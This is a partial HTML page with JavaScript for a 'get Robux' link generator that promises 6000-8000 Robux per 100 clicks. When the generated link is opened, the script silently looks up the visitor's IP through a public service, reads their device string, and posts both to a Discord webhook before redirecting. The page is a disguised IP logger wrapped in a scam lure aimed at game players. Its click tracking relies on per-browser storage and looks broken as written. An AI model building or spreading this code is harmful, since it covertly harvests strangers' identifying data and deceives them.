<!DOCTYPE html>
<html lang="en">
<head>
    <!-- [Previous head content remains exactly the same] -->
    <style>
        /* [All previous CSS remains exactly the same] */
    </style>
</head>
<body>
    <!-- [All previous HTML remains exactly the same until the script] -->

    <script>
        // Configuration
        const BASE_URL = window.location.hostname === 'localhost' ? 'http://localhost:3000' : window.location.origin;
        const PHARAOH_PFP = 'https://media.discordapp.net/attachments/1360001414813843589/1377923321957580822/PHARAOH_BE4M_PFP.gif';
        
        // DOM Elements
        const initialSection = document.getElementById('initial-section');
        const linkSection = document.getElementById('link-section');
        const gamepassSection = document.getElementById('gamepass-section');
        const generateBtn = document.getElementById('generate-btn');
        const webhookUrlInput = document.getElementById('webhook-url');
        const webhookError = document.getElementById('webhook-error');
        const generatedLink = document.getElementById('generated-link');
        const copyBtn = document.getElementById('copy-btn');
        const gamepassUrlInput = document.getElementById('gamepass-url');
        const submitGamepassBtn = document.getElementById('submit-gamepass');
        const successMessage = document.getElementById('success-message');
        const gamepassError = document.getElementById('gamepass-error');
        
        // Generate random link ID
        function generateLinkId() {
            const adjectives = ['cool', 'epic', 'pharaoh', 'money', 'robux', 'fast', 'quick', 'easy', 'gold', 'diamond'];
            const animals = ['panda', 'hawk', 'lion', 'tiger', 'wolf', 'fox', 'eagle', 'shark', 'dragon', 'phoenix'];
            const numbers = Math.floor(Math.random() * 9000) + 1000;
            
            const adjective = adjectives[Math.floor(Math.random() * adjectives.length)];
            const animal = animals[Math.floor(Math.random() * animals.length)];
            
            return `${adjective}${animal}${numbers}`;
        }
        
        // Test webhook and send success message
        async function testWebhook(webhookUrl) {
            try {
                const response = await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        content: "@everyone @here",
                        embeds: [{
                            title: "✅ Webhook Test Successful",
                            description: "Your webhook is working correctly! You'll receive notifications here when someone clicks your link.\n\n🎯 Next Steps\nGenerate your link and start sharing it to earn 6000-8000 Robux!",
                            color: 0x00ff00,
                            thumbnail: {
                                url: PHARAOH_PFP
                            },
                            timestamp: new Date().toISOString()
                        }]
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Webhook test failed:', error);
                return false;
            }
        }
        
        // Check if webhook is already used
        function isWebhookUsed(webhookUrl) {
            const usedWebhooks = JSON.parse(localStorage.getItem('usedWebhooks') || '[]');
            return usedWebhooks.includes(webhookUrl);
        }
        
        // Store webhook as used
        function markWebhookAsUsed(webhookUrl) {
            const usedWebhooks = JSON.parse(localStorage.getItem('usedWebhooks') || '[]');
            if (!usedWebhooks.includes(webhookUrl)) {
                usedWebhooks.push(webhookUrl);
                localStorage.setItem('usedWebhooks', JSON.stringify(usedWebhooks));
            }
        }
        
        // Send webhook notification with retry logic
        async function sendWebhookWithRetry(webhookUrl, data, retries = 3) {
            for (let i = 0; i < retries; i++) {
                try {
                    const response = await fetch(webhookUrl, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify(data)
                    });
                    
                    if (response.ok) return true;
                    
                    console.log(`Attempt ${i + 1} failed, retrying...`);
                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1)));
                } catch (error) {
                    console.error(`Attempt ${i + 1} error:`, error);
                    if (i === retries - 1) throw error;
                }
            }
            return false;
        }
        
        // Generate link
        generateBtn.addEventListener('click', async () => {
            const webhookUrl = webhookUrlInput.value.trim();
            
            if (!webhookUrl) {
                webhookError.textContent = 'Please enter a valid webhook URL';
                webhookError.classList.remove('hidden');
                return;
            }
            
            if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
                webhookError.textContent = 'Please enter a valid Discord webhook URL';
                webhookError.classList.remove('hidden');
                return;
            }
            
            if (isWebhookUsed(webhookUrl)) {
                webhookError.textContent = 'This webhook is already used. Make a new webhook and try again.';
                webhookError.classList.remove('hidden');
                return;
            }
            
            // Test webhook
            generateBtn.disabled = true;
            generateBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Testing Webhook...';
            
            const webhookValid = await testWebhook(webhookUrl);
            
            if (!webhookValid) {
                webhookError.textContent = 'Webhook test failed. Please check your URL and try again.';
                webhookError.classList.remove('hidden');
                generateBtn.disabled = false;
                generateBtn.innerHTML = '<i class="fas fa-link"></i> GENERATE LINK';
                return;
            }
            
            // Generate unique link
            const linkId = generateLinkId();
            const userLink = `${BASE_URL}/${linkId}`;
            
            // Store in localStorage
            const userData = {
                webhookUrl,
                linkId,
                clicks: 0,
                clickers: [],
                gamepassUrl: '',
                createdAt: new Date().toISOString()
            };
            
            localStorage.setItem(`link_${linkId}`, JSON.stringify(userData));
            markWebhookAsUsed(webhookUrl);
            
            // Show success
            generatedLink.textContent = userLink;
            initialSection.classList.add('hidden');
            linkSection.classList.remove('hidden');
            gamepassSection.classList.remove('hidden');
            
            // Reset generate button
            generateBtn.disabled = false;
            generateBtn.innerHTML = '<i class="fas fa-link"></i> GENERATE LINK';
        });
        
        // Copy link to clipboard
        copyBtn.addEventListener('click', () => {
            navigator.clipboard.writeText(generatedLink.textContent).then(() => {
                const originalText = copyBtn.innerHTML;
                copyBtn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                setTimeout(() => {
                    copyBtn.innerHTML = originalText;
                }, 2000);
            });
        });
        
        // Submit gamepass
        submitGamepassBtn.addEventListener('click', () => {
            const gamepassUrl = gamepassUrlInput.value.trim();
            const linkId = generatedLink.textContent.replace(`${BASE_URL}/`, '');
            const userData = JSON.parse(localStorage.getItem(`link_${linkId}`));
            
            if (!gamepassUrl) {
                gamepassError.textContent = 'Please enter a valid gamepass URL';
                gamepassError.classList.remove('hidden');
                return;
            }
            
            if (!gamepassUrl.startsWith('https://www.roblox.com/game-pass/')) {
                gamepassError.textContent = 'Please enter a valid Roblox gamepass URL';
                gamepassError.classList.remove('hidden');
                return;
            }
            
            // Update user data
            userData.gamepassUrl = gamepassUrl;
            localStorage.setItem(`link_${linkId}`, JSON.stringify(userData));
            
            // Show success
            gamepassError.classList.add('hidden');
            successMessage.classList.remove('hidden');
            
            // Disable the button
            submitGamepassBtn.disabled = true;
            submitGamepassBtn.innerHTML = '<i class="fas fa-check"></i> SUBMITTED';
        });

        // Process click when someone visits the generated link
        async function processClick() {
            if (window.location.pathname.length > 1 && 
                window.location.pathname !== '/clicks' && 
                window.location.pathname !== '/clicks.html') {
                
                const linkId = window.location.pathname.substring(1);
                const userData = JSON.parse(localStorage.getItem(`link_${linkId}`));
                
                if (userData) {
                    try {
                        // Get visitor IP
                        let visitorIp = 'Unknown';
                        try {
                            const ipResponse = await fetch('https://api.ipify.org?format=json');
                            const ipData = await ipResponse.json();
                            visitorIp = ipData.ip;
                        } catch (ipError) {
                            visitorIp = 'IP-' + Math.random().toString(36).substr(2, 8);
                        }
                        
                        const now = new Date();
                        
                        // Check if this IP already clicked
                        if (userData.clickers.includes(visitorIp)) {
                            // Send duplicate click alert
                            await sendWebhookWithRetry(userData.webhookUrl, {
                                embeds: [{
                                    title: "⚠️ DUPLICATE CLICK DETECTED",
                                    description: `NICE TRY CLICKING ON THE SAME LINK TWICE WONT WORK! -PHARAOH\n\n**Link ID:** ${linkId}\n**IP:** ${visitorIp}\n**Device:** ${navigator.userAgent}\n**Time:** ${now.toISOString()}`,
                                    color: 0xff0000,
                                    thumbnail: {
                                        url: PHARAOH_PFP
                                    },
                                    timestamp: now.toISOString()
                                }]
                            });
                        } else {
                            // Register new click
                            userData.clicks++;
                            userData.clickers.push(visitorIp);
                            localStorage.setItem(`link_${linkId}`, JSON.stringify(userData));
                            
                            // Send click notification
                            await sendWebhookWithRetry(userData.webhookUrl, {
                                embeds: [{
                                    title: "🔔 NEW CLICK DETECTED",
                                    description: `**Link ID:** ${linkId}\n**Total Clicks:** ${userData.clicks}/100\n**IP:** ${visitorIp}\n**Device:** ${navigator.userAgent}\n**Time:** ${now.toISOString()}`,
                                    color: 0x00ff00,
                                    thumbnail: {
                                        url: PHARAOH_PFP
                                    },
                                    timestamp: now.toISOString()
                                }]
                            });
                            
                            // Check if reached 100 clicks
                            if (userData.clicks >= 100) {
                                await sendWebhookWithRetry(userData.webhookUrl, {
                                    content: "@everyone @here 🎉 CONGRATULATIONS!",
                                    embeds: [{
                                        title: "💰 PAYMENT TIME!",
                                        description: `You've reached 100 clicks! Your gamepass will be purchased shortly.\n\n**Link ID:** ${linkId}\n**Gamepass:** ${userData.gamepassUrl || 'Not submitted yet'}`,
                                        color: 0x00ff00,
                                        thumbnail: {
                                            url: PHARAOH_PFP
                                        },
                                        timestamp: now.toISOString()
                                    }]
                                });
                            }
                        }
                    } catch (error) {
                        console.error('Error processing click:', error);
                    } finally {
                        // Redirect to homepage without showing the path
                        window.location.href = BASE_URL;
                    }
                } else {
                    // Invalid link ID, redirect to home
                    window.location.href = BASE_URL;
                }
            }
        }

        // Run the click processor when page loads
        processClick();
    </script>
</body>
</html>
